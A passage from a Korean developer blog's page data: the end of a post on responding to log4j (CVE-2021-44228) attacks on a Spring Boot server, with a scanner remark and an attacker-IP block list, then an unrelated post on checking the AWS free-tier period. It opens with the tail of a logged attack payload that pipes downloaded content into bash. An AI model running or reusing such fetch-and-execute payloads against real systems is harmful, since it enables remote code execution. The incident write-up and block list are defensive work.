195.54.160.149:5874/3.36.159.204:80)|bash</p>\n</blockquote>\n<p>참고 url 중에 차단 권고에 나온 시도가 많았다.<br>\n조기에 발견해서 다행인거 같고…정말 침입시도가 무수했다…<br>\n모두 대응 처리를 해뒀다.</p>\n<br>\n<h3 id=\"부록---래브라도\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84\" aria-label=\"부록   래브라도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - 래브라도</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도</a> 에서 log4j 취약점 점검 도구를 제공하고 있다.<br>\n그런데 난 사용해도 이상하게 검출이 안되었다;;</p>\n<p>사용법은 저기 나와있겠지만…<br>\n프로젝트 디렉토리를 난 해당 프로젝트의 root 디렉토리로 잡아보고, jar 파일만 있는 곳에서도 해봤는데 검출 결과가 0이었다.<br>\n그 때 2.11 사용했었는데…<br>\n아마 user agent를 다른 방식으로 기록해서 그런가…<br>\n무튼 정 찝찝하면 한번 돌려보는 것도 좋은 방법일듯…</p>\n<br>\n<h3 id=\"부록---ip-처리\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC\" aria-label=\"부록   ip 처리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - IP 처리</h3>\n<p>LG CNS와 talos 글에 나온 ip를 차단하였다.<br>\n난 저 아이피에 class 대역 차단으로 더 막아뒀다.</p>\n<p>171.25.193.0/24<br>\n185.220.0.0/16</p>\n<p>이 두놈이 좀 많았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">109.237.96.124 1; #log4j attacker\n        185.100.87.202 1;\n        213.164.204.146 1;\n        185.220.101.146 1;\n        171.25.193.20 1;\n        178.17.171.102 1;\n        45.155.205.233 1;\n        171.25.193.25 1;\n        171.25.193.77 1;\n        171.25.193.78 1;\n        182.220.100.242 1;\n        185.220.101.39 1;\n        18.27.197.252 1;\n        89.234.182.139 1;\n        104.244.79.6 1;\n        80.71.158.12 1;\n        45.137.155.55 1;\n        89.249.63.3 1;\n        61.19.25.207 1;\n        195.251.41.139 1;\n        131.100.148.7 1;\n        46.105.95.220 1;\n        170.210.45.163 1;\n        5.157.38.50 1;\n        114.112.161.155 1;\n        221.228.87.37 1;\n        191.232.38.25 1;\n        164.52.53.163 1;\n        45.130.229.168 1;\n        133.130.120.176 1;\n        152.89.239.12 1;\n        163.172.157.143 1;\n        205.185.115.217 1; #log4 attacker</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9\">요새 시끄러운 log4j2 공격…</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80\">어떻게 공격이 들어오는가?</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80\">그래서 어떻게 처리했는가?</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D\">정리 및 참고 그리고 부록…</a></p>\n<ul>\n<li><a href=\"#%EC%A0%95%EB%A6%AC\">정리</a></li>\n<li><a href=\"#%EC%B0%B8%EA%B3%A0\">참고</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---%EC%95%85%EC%9A%A9%ED%83%90%EC%A7%80\">부록 - 악용탐지</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84\">부록 - 래브라도</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC\">부록 - IP 처리</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"2021.12.14","title":"Spring boot log4j 취약점 처리 후기 (CVE-2021-44228)","categories":"spring_spring-boot","emoji":"📜"},"fields":{"slug":"/spring_spring-boot/211214_springboot-log4j-hack/"}},"prev":{"id":"b4f7990a-0d15-5177-8e98-defd8c807dc4","html":"<h1 id=\"aws-프리티어-기간을-확인해보려면\" style=\"position:relative;\"><a href=\"#aws-%ED%94%84%EB%A6%AC%ED%8B%B0%EC%96%B4-%EA%B8%B0%EA%B0%84%EC%9D%84-%ED%99%95%EC%9D%B8%ED%95%B4%EB%B3%B4%EB%A0%A4%EB%A9%B4\" aria-label=\"aws 프리티어 기간을 확인해보려면 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AWS 프리티어 기간을 확인해보려면…</h1>\n<p>최근 개발용으로 쓰던 계정들의 프리티어가 언제까지인지 궁금해졌다.<br>\n이걸 확인해보는 방법은 간단했다.</p>\n<h3 id=\"1-aws-console-에-접속한다\" style=\"position:relative;\"><a href=\"#1-aws-console-%EC%97%90-%EC%A0%91%EC%86%8D%ED%95%9C%EB%8B%A4\" aria-label=\"1 aws console 에 접속한다 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. AWS Console 에 접속한다.</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 654px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 118.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAABYlAAAWJQFJUiTwAAADlElEQVQ4y5WUyW/bRhTG594WRRC3WbyQHFKSKUpcREukLHEoqZbXOPFSxYtsR4ni3YJRd5F9KNpLczJy6b1ogbaHBgiCNrcA7b1Aj0H+iN56CUDX/ApRquI6qRIdfpjHmcc333sz8wiv2OAV2+eVtM8ptj9o5nyqZvyBqOVr6aIfNlhgh3THl4fyjTXwSvqUi1q/cHLyW05Ofc/JqR84OfkNF7V+I0LcBdXYCdWYx8ez3vzajme6097ViOXd2v7Ey46XAjs3tejNrWx5hjN1Iuruc9EsXqbxNKGKRWjMIjQ+TAQtx4ho276ouhB1BlFjiJgFSLob2OFEHpLRtAXVgaBmAwJfnf0q6eyRpLPHLR6KOvudCBMKxMjIAzHh3BN1dl+IZ4+pxo5FnR0LqtO2Jd1tcF/S3a+oxh5TjeFVEH5MgfDWzYgYLRBJdwlVHSJqLLCFM7aos8BujLzqOE3FznNBdf5ucdIYiTAegxgpfhcacuuizr6kGvuiA431OtXYTy1Fpy8pHBiP+FTOo1+xgwlRd/+t0WtwT5u+/4UUyyXErImTm5VdT06NeFw86zVOXFCdTpy0UvZbYxtS3TlEfzQNd3IBYbMAPu7g/wr+JpDy3X1ciaRgOFPBFWnsctbh/PdrA97e+TS4bzPlDUStYqDwRU26D0o29o9wkdfRJ6cDBpQM+pVh9Mo2+qLpdrA3DUru7H0GOTmC2fIGxubWUJhewvRiFdcW7qA4s9K9wvVaHZcjNvTcDJThScQyU9DcG0i415Fg17qvYbV2BE5S4doWkqaFIdNCeigJWbPRr2RAtW5Trh1hcDCO664NZlsopC2MDqdgmMMQAqcuFVZqh+ihJqg5Al7PNzE+ADXyoGr3d5Ks7NQRs4pYqOyieKOMiQ9vYblaw1K1Bi6Waad7luZGLxO8lNu1Q1ySzOCkJSOHkJFD2MwHfbGTEuEcbYWb+0fooQmEErmgkb74yenYHCJGk8FEE6k1T6p7dfQIRqDufGrnETUHVxQXn0/LeFK5ikerfXhQ7sfPq734cZmHbGRB7tbqeE80gzRf1Y7OEjYY3o/l8XBNwF8fvY2nmxfwR/UCnm2+iz8PLkIbyoKsbR3gnd4YBmKZ4Ll1ok+2cSmSxqSt4uPREPZGwtgvhnEwGkLFHQQXtUDuHX+NsdkVzK9uYra83pnldcyV1zG+uIlcaRuF0jbypS3kS9sYW9rF/OoW/gG0QO+mkyZJcAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/58f07ff34b78825068470c72de45e6ec/7c297/img_01.webp 180w,\n/static/58f07ff34b78825068470c72de45e6ec/33ecc/img_01.webp 360w,\n/static/58f07ff34b78825068470c72de45e6ec/c0e87/img_01.webp 654w\"\n              sizes=\"(max-width: 654px) 100vw, 654px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/58f07ff34b78825068470c72de45e6ec/e9ea2/img_01.png 180w,\n/static/58f07ff34b78825068470c72de45e6ec/53918/img_01.png 360w,\n/static/58f07ff34b78825068470c72de45e6ec/ba4a2/img_01.png 654w\"\n            sizes=\"(max-width: 654px) 100vw, 654px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/58f07ff34b78825068470c72de45e6ec/ba4a2/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위 사진과 같이 로그인 이후 우측 상단의 계정을 클릭하여 <strong>결제 대시보드</strong> 로 이동한다.</p>\n<br>\n<h3 id=\"2-청구서-항목을-클릭한다\" style=\"position:relative;\"><a href=\"#2-%EC%B2%AD%EA%B5%AC%EC%84%9C-%ED%95%AD%EB%AA%A9%EC%9D%84-%ED%81%B4%EB%A6%AD%ED%95%9C%EB%8B%A4\" aria-label=\"2 청구서 항목을 클릭한다 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. 청구서 항목을 클릭한다.</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAACEklEQVQ4y6WRTW8SURiF+RP+AINhmujKCJQvkfCtZARTsSbCqrQ1pjvTJWDYoGlMpcxgShPYwdqFRomoU23UlSsSKGwZTU1GPhSZYTjmDtJCRDY9yTN35uZ9zz1zX9UOmwXh4dYTPHqcwtZ2Gumne8oeWdOZPexkskixu7Nhdkf1maxSq8Jf8XwTX/kmRLGP00g1GAxA+CEIOGr9wjfhJ5rfW+j2gf4Q+E2Qgd5gNq2ejE5PgiSJEEUJKlmWMRwO0e108KVSx7PnJbwolfHu/UeU3nB4+fotytwH7B98BnfwaYLR96vyPo6ErpKO+KjIg5hKkgSWYUDTNELhMHw+HzbvbyLxIIHQnRD0ej3MZjNMJtMURqMRh4c1xZD4HBsKggCWZeH3+xGJrOBWMIjIyio27m1gefk27HY7XC4XnE7nFGS/VhsZiqI4GgpJR1QoFHD1mg9r63cRCNyA0WRUUlitVjgcDqWZrJPYbDbU6/XphGNDhmFw4ewZOC6pcfH8OWioBSxQFCiKgkajmYlarUalUlH62+32KCGZMlE+n4fLYUMw4MOVy2boFxdhMBjmotPp/v3lsWGxWEQoFMbq2jpo+jrcbje8Xi88Hs9/IffaaDROpjxpmMvllKKbS0uwWCzK6WS689BqtahWqyd3OH4h4jgOyWQSqVQKiUQCsVgM8Xh8LtFoFDzPTxuO455G4/4/4aH9QqreooMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/43c86a2a9bff34b761de23ad684855a7/7c297/img_02.webp 180w,\n/static/43c86a2a9bff34b761de23ad684855a7/33ecc/img_02.webp 360w,\n/static/43c86a2a9bff34b761de23ad684855a7/df77d/img_02.webp 720w,\n/static/43c86a2a9bff34b761de23ad684855a7/b36b9/img_02.webp 1020w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/43c86a2a9bff34b761de23ad684855a7/e9ea2/img_02.png 180w,\n/static/43c86a2a9bff34b761de23ad684855a7/53918/img_02.png 360w,\n/static/43c86a2a9bff34b761de23ad684855a7/242a6/img_02.png 720w,\n/static/43c86a2a9bff34b761de23ad684855a7/02d09/img_02.png 1020w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/43c86a2a9bff34b761de23ad684855a7/242a6/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>청구서의 청구 기간을 하단으로 내리면 최초 청구일이 나오는데 그거에서 <strong>1년</strong>이 지난 기간이 프리티어 기간이다.</p>\n<br>\n<hr>\n<p>나처럼 개발용으로 사용하는 사람들은 이 기간을 잘 확인해두었다가 마지막 달에 사용하는 서비스를 모두 정리하고 계정을 탈퇴하면 된다.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#1-aws-console-%EC%97%90-%EC%A0%91%EC%86%8D%ED%95%9C%EB%8B%A4\">1. AWS Console 에 접속한다.</a></li>\n<li><a href=\"#2-%EC%B2%AD%EA%B5%AC%EC%84%9C-%ED%95%AD%EB%AA%A9%EC%9D%84-%ED%81%B4%EB%A6%AD%ED%95%9C%EB%8B%A4\">2. 청구서 항목을 클릭한다.</a></li>\n</ul>\n</div>","frontmatter":{"date":"2022.02.02","title":"아마존 프리티어 기간 확인하기","categories":"aws","emoji":"📜"},"fields":{"slug":"/aws/220202_aws-free-final/"}},"site":{"siteMetadata":{"siteUrl":"https://elfinlas.github.io","comments":{"utterances":{"repo":"elfinlas/blog_utterances"}},"projects":[{"title":"마와셀(웹) - 와인 가격 비교","description":"와인 가격 비교 서비스","techStack":["Typescript","React","Next.Js","Nest.Js"],"thumbnailUrl":"myc_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223393940649","github":"","web":"https://appmyc.info","googlePlay":"","appStore":""}},{"title":"마와셀(엡) - 와인과 셀러 관리, 시음노트","description":"보유한 와인의 관리, 시음노트 작성, 보유 와인 셀러의 관리 어플리케이션","techStack":["Dart","Flutter","hive","provider"],"thumbnailUrl":"myc_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223531933037","github":"","web":"","googlePlay":"https://play.google.com/store/apps/details?id=dev.mhlab.myc","appStore":"https://itunes.apple.com/kr/app/apple-store/6474965246"}},{"title":"흑우집합소(웹) - 로또번호 추천 서비스","description":"로또번호 추천 서비스","techStack":["Typescript","React","Next.Js","Nest.Js"],"thumbnailUrl":"bcow_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223059966682","github":"","web":"https://bcow.world/","googlePlay":"","appStore":""}},{"title":"흑우집합소(앱) - 로또번호 추천 서비스","description":"로또번호 추천 서비스","techStack":["Dart","Flutter","drift","provider"],"thumbnailUrl":"bcow_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223232966579","github":"","web":"","googlePlay":"https://play.google.com/store/apps/details?id=dev.mhlab.bcow_world","appStore":"https://itunes.apple.com/kr/app/apple-store/6470312130"}}]}}},"pageContext":{"slug":"/my_project/211229_introduce-sml/","nextSlug":"/spring_spring-boot/211214_springboot-log4j-hack/","prevSlug":"/aws/220202_aws-free-final/"}},"staticQueryHashes":["1186322783","1321405810","3649515864"]}